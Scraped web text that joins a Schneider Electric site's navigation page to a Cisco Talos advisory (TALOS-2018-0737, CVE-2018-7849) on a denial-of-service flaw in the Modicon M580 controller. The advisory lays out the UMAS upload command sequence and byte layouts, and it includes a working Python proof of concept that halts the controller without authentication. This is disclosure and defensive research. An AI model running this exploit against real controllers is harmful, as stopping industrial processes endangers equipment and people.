=== Content from www.schneider-electric.com_82d35614_20250126_004720.html ===


Skip To Main Content

[Share Price](https://www.se.com/ww/en/about-us/investor-relations/share-information/share-price.jsp)

Global(English)

[![SE logo LIO white header](https://www.se.com/ww/en/assets/v2/564/media/202250/SE_logo-LIO-white_header.svg)](https://www.se.com/ww/en "SE logo LIO white header")

Cancel

[![Impact-Company-Logo-English Black-01-177x54](https://www.se.com/ww/en/assets/v2/564/media/305815/Impact%20Co%20logo%20English%20Black-01-177x54.svg)](https://www.se.com/ww/en/about-us/sustainability/)

* Main Menu

  Insights
* Main Menu

  Solutions
* Main Menu

  Sustainability
* Main Menu

  Company
* Main Menu

  Investors
* Main Menu

  Careers

[Share Price](https://www.se.com/ww/en/about-us/investor-relations/share-information/share-price.jsp)

Global(English)

[![Impact-Company-Logo-English Black-01-177x54](https://www.se.com/ww/en/assets/v2/564/media/305815/Impact%20Co%20logo%20English%20Black-01-177x54.svg)](https://www.se.com/ww/en/about-us/sustainability/)

Welcome to the Schneider Electric corporate Website

[ENGLISH](https://www.se.com/ww/en/ "Schneider Electric Global Website") | [FRENCH](https://www.se.com/ww/fr/ "Bienvenue sur le site web Global de Schneider Electric ")

Stay on the Global site

Select your location

Accessibility mode off
Accessibility mode on

![&nbsp;](https://www.se.com/ww/en/assets/v2/images/footer-background/900/image.jpg)

[Careers](https://www.se.com/ww/en/about-us/careers/overview.jsp "Careers")

[Company](https://www.se.com/ww/en/about-us/ "Company")

[Our Purpose](https://www.se.com/ww/en/about-us/company-purpose/ "Our Purpose")
[Company profile](https://www.se.com/ww/en/about-us/company-profile/ "Company profile")
[Report a misconduct](https://www.se.com/ww/en/about-us/sustainability/responsibility-ethics/trustline/ "Report a misconduct")
[Accessibility](https://www.se.com/ww/en/about-us/accessibility/ "Accessibility")
[Newsroom](https://www.se.com/ww/en/about-us/newsroom/ "Newsroom")

[Investors](https://www.se.com/ww/en/about-us/investor-relations/ "Investors")

[Financials Results](https://www.se.com/ww/en/about-us/investor-relations/financial-results.jsp "Financials Results")
[Annual Reports](https://www.se.com/ww/en/about-us/investor-relations/regulatory-information/annual-reports.jsp "Annual Reports")
[Share Price](https://www.se.com/ww/en/about-us/investor-relations/share-information/share-price.jsp "Share Price")
[Investor Events](https://www.se.com/ww/en/about-us/investor-relations/financial-calendar-and-events.jsp "Investor Events")

[Insights](https://www.se.com/ww/en/insights/ "Insights")

[Sustainability](https://www.se.com/ww/en/insights/sustainability/ "Sustainability")
[Electricity 4.0](https://www.se.com/ww/en/insights/electricity-4-0/ "Electricity 4.0")
[Next-generation Automation](https://www.se.com/ww/en/insights/next-generation-automation/ "Next-generation Automation")

Sustainability

[Reports](https://www.se.com/ww/en/about-us/sustainability/sustainability-reports/ "Reports")
[Foundation](https://www.se.com/ww/en/about-us/sustainability/foundation/ "Foundation")
[Consulting](https://www.se.com/ww/en/work/services/sustainability-business/sustainability-consulting/ "Consulting")

[Solutions](https://www.se.com/ww/en/work/solutions/ "Solutions")

[Software](https://www.se.com/ww/en/work/solutions/software/ "Software")

[Blog](https://blog.se.com/ "Blog")

Get monthly updates from Schneider Electric delivered right to your inbox.

Email

Please enter a valid email address

I am a...
I am a...

Contractor

Architect

Interior Designer

Specifying Consultant or Engineer

E-commerce pure-player

Electrical Distributor

IT Distributor

DIY or Retailer

Electrician

Engineering, Procurement, Construction

IT Channel Partner

Machine Builder / OEM

Panel Builder

Software or Service Provider

Solar Installer

Building System Integrator

Industrial System Integrator

Power System Integrator

Small / Medium Business End User

Large Corporation End User

Home Builder / Developer

Home Owner / Consumer

Student / Job Seeker

Please check this box

Problem with captcha verification, please check your connection

Subscribe

I'd like to receive news and commercial info from Schneider Electric and its affiliates via electronic communication means such as email, and I agree to the collection of information on the opening and clicks on these emails (using invisible pixels in the images), to measure performance of our communications and improve them. For more details, please read our [Privacy Policy.](https://www.se.com/ww/en/about-us/legal/data-privacy.jsp "Privacy Policy.")

[![Impact Logo Company English White 177x54.svg](https://www.se.com/ww/en/assets/v2/564/media/305813/Impact%20Co%20logo%20English%20White-01-177x54.svg)](https://www.se.com/ww/en/about-us/sustainability/ "Sustainability")

[Global - FR  opens in new Window](https://www.se.com/ww/fr/ "Global - FR")
[Legal Information](https://www.se.com/ww/en/about-us/legal/legal-information.jsp "Legal Information")
[Privacy Policy](https://www.se.com/ww/en/about-us/legal/data-privacy.jsp "Privacy Policy")
[Cookie Notice](https://www.se.com/ww/en/about-us/legal/cookie-notice.jsp "Cookie Notice")
Change your cookie settings
 opens in new Window

[Â©2025, Schneider Electric](https://www.se.com/ww/en/about-us/legal/legal-information.jsp "Â©2025, Schneider Electric")

Thank you for subscribing to us

Now, you will be the first to know the updates from Schneider Electric. You will receive your welcome message soon. Enjoy!



=== Content from www.talosintelligence.com_c9eef19e_20250126_004721.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2018-0737

## Schneider Electric Modicon M580 UMAS strategy transfer denial-of-service vulnerability

##### June 10, 2019

##### CVE Number

CVE-2018-7849

### Summary

An exploitable denial-of-service vulnerability exists in the UMAS strategy transfer functionality of the Schneider Electric Modicon M580 programmable automation controller firmware version SV2.70. A specially crafted UMAS command can cause the device to enter a recoverable fault state, resulting in a stoppage of normal device execution. An attacker can send unauthenticated commands to trigger this vulnerability.

### Tested Versions

Schneider Electric Modicon M580 BMEP582040 SV2.70

### Product URLs

<https://www.schneider-electric.com/en/work/campaign/m580-epac/>

### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### CWE

CWE-248: Uncaught Exception

### Details

The Modicon M580 is the latest in Schneider Electric’s Modicon line of programmable automation controllers. The device contains a Wurldtech Achilles Level 2 certification and global policy controls to quickly enforce various security configurations. Communication with the device is possible over FTP, TFTP, HTTP, SNMP, EtherNet/IP, Modbus and a management protocol referred to as “UMAS.”

When programming a new strategy to a Modicon M580, six UMAS commands must be used in a specific order. First, a valid session and additional privilege must be obtained via a TAKE\_PLC\_RESERVATION request. This request gives the session the ability to successfully send privileged commands. With a valid reservation obtained an INITIALIZE\_UPLOAD command must be sent, indicating that the new program will be following.

After the upload has been initialized, the first block of data must be sent to the device using an UPLOAD\_BLOCK command. Failure to do so will prevent the device from accepting the upload.

Next, a command with the function code 0x6D must be sent. When this command is successfully received, the new strategy must be sent to the device in chunks of size 0x3F4 using the UPLOAD\_BLOCK command. When sending the strategy it is important to resend the first block. Failure to do so will prevent the device from accepting the upload.

Once the strategy has been successfully sent, an END\_STRATEGY\_UPLOAD request must be sent to indicate that the last block has been sent. Finally, a RELEASE\_PLC\_RESERVATION command must be sent to give back the device reservation and restore the normal operating state.

The structure of a TAKE\_PLC\_RESERVATION command takes a form similar to this:

```
    0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
0 | A | B | C | D | E |   F   | G |               H
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
1
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+

A --> Modbus Function Code (0x5A)
B --> Session
C --> UMAS Function Code   (0x10)
D --> Unknown              (0x3B)
E --> Unknown              (0x0E)
F --> Unknown              (0x0000)
G --> Client Name Length   (size of Client Name)
H --> Client Name          (variable size)

```

The structure of the 0x6D command takes a form similar to this:

```
    0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
0 | A | B | C |
  +---+---+---+

A --> Modbus Function Code (0x5A)
B --> Session
C --> UMAS Function Code   (0x6D)

```

The structure of a INITIALIZE\_UPLOAD command takes a form similar to this:

```
    0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
0 | A | B | C |   D   |
  +---+---+---+---+---+

A --> Modbus Function Code (0x5A)
B --> Session
C --> UMAS Function Code   (0x30)
D --> Unknown              (0x0001)

```

The structure of a UPLOAD\_BLOCK command takes a form similar to this:

```
    0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
0 | A | B | C |   D   |   E   |   F   |               G
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
1
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+

A --> Modbus Function Code (0x5A)
B --> Session
C --> UMAS Function Code   (0x31)
D --> Unknown              (0x0001)
E --> Block Number
F --> Block Size           (0x03F4)
G --> Data

```

The structure of a END\_STRATEGY\_UPLOAD command takes a form similar to this:

```
    0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
0 | A | B | C |   D   |   E   |
  +---+---+---+---+---+---+---+

A --> Modbus Function Code (0x5A)
B --> Session
C --> UMAS Function Code   (0x32)
D --> Unknown              (0x0001)
E --> Blocks Sent

```

The structure of a RELEASE\_PLC\_RESERVATION command takes a form similar to this:

```
    0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
  +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
0 | A | B | C |
  +---+---+---+

A --> Modbus Function Code (0x5A)
B --> Session
C --> UMAS Function Code   (0x11)

```

If the strategy uploaded during this process does not properly implement the file integrity checks it will cause the device to fail at the END\_STRATEGY\_UPLOAD step and trigger a recoverable fault state. In this state, the device stops its normal execution and removes the existing strategy. Recovery is possible through the use of the programming software UnityPro.

### Exploit Proof of Concept

```
import struct
import socket
from time import sleep
from scapy.all import Raw
from scapy.contrib.modbus import ModbusADURequest
from scapy.contrib.modbus import ModbusADUResponse

def send_message(sock, umas, data=None, wait_for_response=True):
    if data == None:
        packet = ModbusADURequest(transId=1)/umas
    else:
        packet = ModbusADURequest(transId=1)/umas/data
    msg = "%s" % Raw(packet)
    resp = ""
    sock.send(msg)
    if wait_for_response:
        resp = sock.recv(2048)
    return resp

def main():
    rhost = "192.168.10.1"
    rport = 502

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((rhost, rport))

    # TAKE_PLC_RESERVATION
    mbtcp_fnc = "\x5a"
    init_session = "\x00"
    umas_fnc = "\x10"
    unknown = "\x25\x10\x00\x00"
    client_name = "test"
    client_name_len = len(client_name)
    umas = "%s%s%s%s%s%s" % (mbtcp_fnc, init_session, umas_fnc, unknown, client_name_len, client_name)
    res = send_message(sock=s, umas=umas)
    if res[9] != "\xfe":
        print "[!] an error has occurred getting the PLC reservation"
    session = res[-1]

    # INITIALIZE_UPLOAD
    umas_fnc = "\x30"
    unknown = "\x00\x01"
    umas = "%s%s%s%s" % (mbtcp_fnc, session, umas_fnc, unknown)
    send_message(sock=s, umas=umas)

    # Read in prepared APX file
    data = ""
    with open("Station.apx", 'rb') as f:
        data = f.read()

    # Build APX File Blocks
    apx_len = len(data)
    blocks = []
    block = {}
    block_len = 0x3f4
    block_number = 1
    for i in xrange(apx_len):
        mod = i % block_len

        if mod == 0:
            block = {}
            block['blockNum'] = block_number
            block['data'] = data[i]
            blocks.append(block)

        else:
            blocks[block_number-1]['data'] = "%s%s" % (blocks[block_number-1]['data'], data[i])
            if mod == block_len-1 or i == apx_len-1:
                block['blockDataSize'] = len(blocks[block_number-1]['data'])
                block_number += 1

    # UPLOAD_BLOCK request for First Block
    umas_fnc = "\x31"
    block_num = 1
    block_size = len(blocks[block_num]['data'])
    conv_block_num = struct.pack("<H", block_num)
    conv_block_size = struct.pack("<H", block_size)
    umas = "%s%s%s%s%s%s" % (mbtcp_fnc, session, umas_fnc, unknown, conv_block_num, conv_block_size)
    send_message(sock=s, umas=umas, data=blocks[0]['data'])

    # Required FNC 0x6D
    umas_fnc = "\x6d"
    umas = "%s%s%s" % (mbtcp_fnc, session, umas_fnc)
    send_data = "00040101000000".decode('hex')
    send_message(sock=s, umas=umas, data=send_data)

    # UPLOAD_BLOCK request with repeated First Block
    send_data = ""
    umas_fnc = "\x31"
    blocks_len = len(blocks)
    for i in xrange(blocks_len):
        conv_block_num = struct.pack("<H", blocks[i]['blockNum'])
        block_size = len(blocks[i]['data'])
        conv_block_size = struct.pack("<H", block_size)
        umas = "%s%s%s%s%s%s" % (mbtcp_fnc, session, umas_fnc, unknown, conv_block_num, conv_block_size)
        send_message(sock=s, umas=umas, data=blocks[i]['data'])
        sleep(.02)

    # END_UPLOAD
    umas_fnc = "\x32"
    unknown = "\x00\x01"
    num_blocks = struct.pack("<H", len(blocks))
    umas = "%s%s%s%s%s" % (mbtcp_fnc, session, umas_fnc, unknown, num_blocks)
    send_message(sock=s, umas=umas)

    # RELEASE_RESERVATION
    umas_fnc = "\x11"
    umas = "%s%s%s" % (mbtcp_fnc, session, umas_fnc)
    send_message(sock=s, umas=umas)

    # clean up
    s.close()

if __name__ == '__main__':
    main()

```
### Timeline

2018-12-10 - Initial contact

2018-12-17 - Vendor acknowledged

2019-01-01 - 30 day follow up

2019-05-14 - Vendor Patched

2019-06-10 - Public Release

##### Credit

Discovered by Jared Rittle of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2018-0738](/vulnerability_reports/TALOS-2018-0738) [Previous Report

TALOS-2018-0735](/vulnerability_reports/TALOS-2018-0735)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)


